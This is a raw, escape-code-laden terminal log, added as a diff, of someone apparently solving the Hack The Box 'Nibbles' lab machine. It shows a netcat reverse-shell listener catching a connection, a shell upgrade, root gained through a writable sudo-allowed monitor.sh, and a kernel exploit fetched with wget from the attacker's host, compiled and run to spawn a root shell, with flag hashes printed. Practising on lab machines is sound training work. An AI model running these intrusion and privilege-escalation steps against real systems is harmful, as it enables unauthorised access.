@@ -1,0 +1,145 @@
+nnc -lnvp 9001[?1l>[?2004l
+knc\listening on [any] 9001 ...
+^A^[[A      
+
+^C
+%                                                                                                                                                                                                   k..1.Nibbles/IPT\]7;file://sdds/home/sdds/Documents/Obsidian/HackTheBox/0.1_HTB_Boxes/1.Linux_Ez/1.Nibbles/IPT\[J➜  IPT git:(master) ✗ [?1h=[?2004hnc -lnvp 9001[?1l>[?2004l
+knc\listening on [any] 9001 ...
+^A^[[A      ^C
+%                                                                                                                                                                                                   k..1.Nibbles/IPT\]7;file://sdds/home/sdds/Documents/Obsidian/HackTheBox/0.1_HTB_Boxes/1.Linux_Ez/1.Nibbles/IPT\[J➜  IPT git:(master) ✗ [?1h=[?2004h[H[J[J➜  IPT git:(master) ✗ [J➜  IPT git:(master) ✗ [J➜  IPT git:(master) ✗ [J➜  IPT git:(master) ✗ [J➜  IPT git:(master) ✗ [J➜  IPT git:(master) ✗ nnc -lnvp 9001[?1l>[?2004l
+knc\listening on [any] 9001 ...
+connect to [10.10.16.113] from (UNKNOWN) [10.129.77.225] 34884
+bash: cannot set terminal process group (1273): Inappropriate ioctl for device
+bash: no job control in this shell
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ python3 -c 'import pty; pty.spawn(' "/bin/bash")'
+py<ml/nibbleblog/content/private/plugins/my_image$ pyt                         hon3 -c 'import pty; pty.<ate/plugins/my_image$ python3 -c 'import pty; pty.s                         pawn("/bin/bash")'
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ^L  ^Z
+[1]  + 13660 suspended  nc -lnvp 9001
+%                                                                                                                                                                                                   k..1.Nibbles/IPT\]7;file://sdds/home/sdds/Documents/Obsidian/HackTheBox/0.1_HTB_Boxes/1.Linux_Ez/1.Nibbles/IPT\[J➜  IPT git:(master) ✗ [?1h=[?2004hsststtstty -a[?1l>[?2004l
+kstty\speed 38400 baud; rows 24; columns 195; line = 0;
+intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O;
+min = 1; time = 0;
+-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
+-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8
+opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
+isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
+%                                                                                                                                                                                                   k..1.Nibbles/IPT\]7;file://sdds/home/sdds/Documents/Obsidian/HackTheBox/0.1_HTB_Boxes/1.Linux_Ez/1.Nibbles/IPT\[J➜  IPT git:(master) ✗ [?1h=[?2004hsststtstty - raw -echo ; ffg[?1l>[?2004l
+kstty\[1]  + 13660 continued  nc -lnvp 9001
+ef
+ef: command not found
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ st<ml/nibbleblog/content/private/plugins/my_image$ stt                         y rows 24 cols 195
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ epx  xport TERM- =xtrer   erm
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ [H[2Jnibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ls
+db.xml	image.php  personal
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ [H[2Jnibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd ~
+nibbler@Nibbles:/home/nibbler$ [H[2Jnibbler@Nibbles:/home/nibbler$ ls
+personal.zip  user.txt
+nibbler@Nibbles:/home/nibbler$ cat user.txt 
+79c03865431abf47b90ef24b9695e148
+nibbler@Nibbles:/home/nibbler$ [H[2Jnibbler@Nibbles:/home/nibbler$ sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+nibbler@Nibbles:/home/nibbler$ mkdir -p personal/stuff
+nibbler@Nibbles:/home/nibbler$ cd personal/stuff/
+nibbler@Nibbles:/home/nibbler/personal/stuff$ vim     eh cho << EOF       EOF      EOF > monisotr     tor.    itor.sh
+bash: EOF: No such file or directory
+nibbler@Nibbles:/home/nibbler/personal/stuff$ echo < EOF > monitor.shecho <[1@< EOF >[1@>
+> ~ #!/bin/bash
+> BASH    bash
+> bash: warning: here-document at line 12 delimited by end-of-file (wanted `EOF')
+nibbler@Nibbles:/home/nibbler/personal/stuff$ cat o  m    monitor.sh 
+
+nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh echo << EOF >> monitor.sh
+#!/bin/bash
+bash
+EOF
+nibbler@Nibbles:/home/nibbler/personal/stuff$ [H[2Jnibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh 
+
+
+nibbler@Nibbles:/home/nibbler/personal/stuff$ 
+nibbler@Nibbles:/home/nibbler/personal/stuff$ ch  bash mono itor.sh 
+nibbler@Nibbles:/home/nibbler/personal/stuff$ [H[2Jnibbler@Nibbles:/home/nibbler/personal/stuff$ vim monitor.sh 
+[?1049h[?1h=[2;1H�[6n[2;1H  [1;1H]11;?[1;24r[?12;25h[?12l[?25h[H[2J[?25l[24;1H"monitor.sh" 2L, 2C[>c[3;1H~                                                                                                                                                                                                  [4;1H~                                                                                                                                                                                                  [5;1H~                                                                                                                                                                                                  [6;1H~                                                                                                                                                                                                  [7;1H~                                                                                                                                                                                                  [8;1H~                                                                                                                                                                                                  [9;1H~                                                                                                                                                                                                  [10;1H~                                                                                                                                                                                                  [11;1H~                                                                                                                                                                                                  [12;1H~                                                                                                                                                                                                  [13;1H~                                                                                                                                                                                                  [14;1H~                                                                                                                                                                                                  [15;1H~                                                                                                                                                                                                  [16;1H~                                                                                                                                                                                                  [17;1H~                                                                                                                                                                                                  [18;1H~                                                                                                                                                                                                  [19;1H~                                                                                                                                                                                                  [20;1H~                                                                                                                                                                                                  [21;1H~                                                                                                                                                                                                  [22;1H~                                                                                                                                                                                                  [23;1H~                                                                                                                                                                                                  [24;178H1,0-1[9CAll[1;1H[?12l[?25h[?25l[24;1H-- INSERT --[24;14H[24;178H1,1[11CAll[1;1H[?12l[?25h[?25l![24;180H2[1;2H[?12l[?25h[?25l[1;1H[24;180H1[1;1H[?12l[?25h[?25l#[24;180H2[1;2H[?12l[?25h[?25l![24;180H3[1;3H[?12l[?25h[?25l/[24;180H4[1;4H[?12l[?25h[?25lb[24;180H5[1;5H[?12l[?25h[?25li[24;180H6[1;6H[?12l[?25h[?25ln[24;180H7[1;7H[?12l[?25h[?25l.[24;180H8[1;8H[?12l[?25h[?25l[1;7H[24;180H7[1;7H[?12l[?25h[?25l/[24;180H8[1;8H[?12l[?25h[?25lb[24;180H9[1;9H[?12l[?25h[?25la[24;180H10[1;10H[?12l[?25h[?25ls[24;181H1[1;11H[?12l[?25h[?25lh[24;181H2[1;12H[?12l[?25h[?25l[2;23r[2;1H[L[1;24r[24;178H[24;178H2,1[11CAll[2;1H[?12l[?25h[?25lb[24;180H2[2;2H[?12l[?25h[?25la[24;180H3[2;3H[?12l[?25h[?25lsh[24;180H5[2;5H[?12l[?25h[?25lq[24;180H6[2;6H[?12l[?25h[?25l[2;5H[24;180H5[2;5H[?12l[?25h[24;1H[2;4H[?25l[24;178H2,4[11CAll[2;4H[?12l[?25h[?25l[24;178H[24;1H:[?12l[?25hwq[?25l"monitor.sh" 3L, 18C written
+E138: Can't write viminfo file $HOME/.viminfo!
+Press ENTER or type command to continue[?12l[?25h
+
+[?1l>[?1049lnibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh 
+nibbler@Nibbles:/home/nibbler/personal/stuff$ ./monitor.sh 
+nibbler@Nibbles:/home/nibbler/personal/stuff$ [H[2Jnibbler@Nibbles:/home/nibbler/personal/stuff$ sudo moni    ./monitor.sh 
+]0;root@Nibbles: /home/nibbler/personal/stuffroot@Nibbles:/home/nibbler/personal/stuff# whoami
+root
+]0;root@Nibbles: /home/nibbler/personal/stuffroot@Nibbles:/home/nibbler/personal/stuff# id
+uid=0(root) gid=0(root) groups=0(root)
+]0;root@Nibbles: /home/nibbler/personal/stuffroot@Nibbles:/home/nibbler/personal/stuff# ls
+monitor.sh
+]0;root@Nibbles: /home/nibbler/personal/stuffroot@Nibbles:/home/nibbler/personal/stuff# cd /root
+]0;root@Nibbles: ~root@Nibbles:~# ls
+root.txt
+]0;root@Nibbles: ~root@Nibbles:~# cat root.txt 
+de5e5d6619862a8aa5b9b212314e0cdd
+]0;root@Nibbles: ~root@Nibbles:~# exit
+exit
+nibbler@Nibbles:/home/nibbler/personal/stuff$ uname a -a
+Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+nibbler@Nibbles:/home/nibbler/personal/stuff$ [H[2Jnibbler@Nibbles:/home/nibbler/personal/stuff$ uname 0 
+Linux
+nibbler@Nibbles:/home/nibbler/personal/stuff$ uname -k
+uname: invalid option -- 'k'
+Try 'uname --help' for more information.
+nibbler@Nibbles:/home/nibbler/personal/stuff$ [H[2Jnibbler@Nibbles:/home/nibbler/personal/stuff$ uname a -a
+Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+nibbler@Nibbles:/home/nibbler/personal/stuff$ [H[2Jnibbler@Nibbles:/home/nibbler/personal/stuff$ vm  cd ../..
+nibbler@Nibbles:/home/nibbler$ [H[2Jnibbler@Nibbles:/home/nibbler$ ls
+personal  personal.zip	user.txt
+nibbler@Nibbles:/home/nibbler$ wget 10.10.16.113:8000/priv.cc  -o   O
+wget: option requires an argument -- 'O'
+wget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+nibbler@Nibbles:/home/nibbler$ wget 10.10.16.113:8000/priv.c -O o
+wget: option requires an argument -- 'o'
+wget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+nibbler@Nibbles:/home/nibbler$ wget 10.10.16.113:8000/priv.c -o 0
+wget: invalid option -- '0'
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+nibbler@Nibbles:/home/nibbler$ wget 10.10.16.113:8000/priv.c -0   
+--2023-09-24 10:04:31--  http://10.10.16.113:8000/priv.c
+Connecting to 10.10.16.113:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5553 (5.4K) [text/x-csrc]
+Saving to: 'priv.c'
+
+priv.c                                             0%[                                                                                                          ]       0  --.-KB/s               priv.c                                           100%[=========================================================================================================>]   5.42K  --.-KB/s    in 0.08s   
+
+2023-09-24 10:04:31 (65.8 KB/s) - 'priv.c' saved [5553/5553]
+
+nibbler@Nibbles:/home/nibbler$ [H[2Jnibbler@Nibbles:/home/nibbler$ ls
+personal  personal.zip	priv.c	user.txt
+nibbler@Nibbles:/home/nibbler$ gcc priv.c 
+nibbler@Nibbles:/home/nibbler$ ls
+a.out  personal  personal.zip  priv.c  user.txt
+nibbler@Nibbles:/home/nibbler$ ./a.out 
+task_struct = ffff88003a848e00
+uidptr = ffff8800322e6544
+spawning root shell
+]0;root@Nibbles: /home/nibblerroot@Nibbles:/home/nibbler# id
+uid=0(root) gid=0(root) groups=0(root),1001(nibbler)
+]0;root@Nibbles: /home/nibblerroot@Nibbles:/home/nibbler# exit
+exit
+nibbler@Nibbles:/home/nibbler$ exit
+exit
+nibbler@Nibbles:/home/nibbler/personal/stuff$ exit
+exit
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ex<ml/nibbleblog/content/private/plugins/my_image$ exi                         t
+exit
+%                                                                                                                                                                                                   k..1.Nibbles/IPT\]7;file://sdds/home/sdds/Documents/Obsidian/HackTheBox/0.1_HTB_Boxes/1.Linux_Ez/1.Nibbles/IPT\[J➜  IPT git:(master) ✗ [?1h=[?2004h[H[J[J➜  IPT git:(master) ✗ eexexiexit[?1l>[?2004l
+kexit\
